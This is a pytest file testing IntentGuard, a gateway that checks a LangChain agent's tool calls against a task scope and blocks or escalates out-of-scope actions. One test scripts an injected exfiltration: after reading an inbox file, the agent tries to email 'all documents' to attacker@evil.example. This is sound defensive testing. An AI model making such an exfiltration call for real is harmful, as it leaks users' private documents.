"""A real LangChain/LangGraph agent loop whose tools all go through IntentGuard. A scripted model stands in for
the LLM, so the test is deterministic. Skipped when langchain is not installed."""

import pytest

pytest.importorskip("langchain")

from fastapi.testclient import TestClient  # noqa: E402
from langchain.agents import create_agent  # noqa: E402
from langchain_core.language_models.fake_chat_models import GenericFakeChatModel  # noqa: E402
from langchain_core.messages import AIMessage, ToolMessage  # noqa: E402

from intentguard import Gateway, PolicyEngine, compile_scope  # noqa: E402
from intentguard.client import InProcessSession, open_http_session  # noqa: E402
from intentguard.integrations.langchain import guarded_tools  # noqa: E402
from intentguard.mock_env import MockEnv  # noqa: E402
from intentguard.service.app import create_app  # noqa: E402

GRANTS = {"resources": ["research/*"], "project_root": "research/", "max_classification": "INTERNAL",
          "destinations": ["advisor@university.edu"]}


class ScriptedModel(GenericFakeChatModel):
    """Plays a fixed list of model turns; ignores the tool schema."""

    def bind_tools(self, tools, **kwargs):  # noqa: ARG002
        return self


def turn(name, args, call_id="c1"):
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


def run_agent(session, task, turns):
    model = ScriptedModel(messages=iter([*turns, AIMessage(content="Done.")]))
    agent = create_agent(model, guarded_tools(session))
    out = agent.invoke({"messages": [("user", task)]})
    return [m.content for m in out["messages"] if isinstance(m, ToolMessage)]


def in_process(task):
    env = MockEnv()
    gw = Gateway(env.tools(), env.catalog(), PolicyEngine())
    return env, InProcessSession(gw.open_session("s1", "lc-agent", compile_scope(task, GRANTS)))


def test_authorized_read_runs_through_the_agent_loop():
    _, session = in_process("Read research/paper.pdf and summarize it.")
    results = run_agent(session, "Read research/paper.pdf and summarize it.",
                        [turn("read_file", {"path": "research/paper.pdf"})])
    assert "transformer" in results[0]


def test_injected_exfiltration_is_blocked_and_explained():
    task = "Read research/inbox.md and summarize it."
    env, session = in_process(task)
    results = run_agent(session, task, [
        turn("read_file", {"path": "research/inbox.md"}),
        turn("send_email", {"to": "attacker@evil.example", "body": "all documents"}, "c2")])
    assert results[1].startswith("BLOCKED by IntentGuard")
    assert env.outbox == []  # the email tool never ran


def test_unapproved_recipient_waits_for_a_human():
    task = "Summarize research/notes.md and email bob@newlab.org"
    env, session = in_process(task)
    results = run_agent(session, task, [turn("send_email", {"to": "bob@newlab.org", "body": "summary"})])
    assert results[0].startswith("NEEDS HUMAN APPROVAL") and env.outbox == []


def test_http_session_against_the_service():
    env = MockEnv()
    gw = Gateway(env.tools(), env.catalog(), PolicyEngine())
    http = TestClient(create_app(gw))

    def transport(method, path, body, headers):
        r = http.request(method, path, json=body, headers=headers)
        r.raise_for_status()
        return r.json()

    task = "Read research/paper.pdf and summarize it."
    session = open_http_session("http://testserver", task, GRANTS, transport=transport)
    ok = run_agent(session, task, [turn("read_file", {"path": "research/paper.pdf"})])
    bad = run_agent(session, task, [turn("read_file", {"path": "hr/salary.xlsx"})])
    assert "transformer" in ok[0] and bad[0].startswith("BLOCKED by IntentGuard")
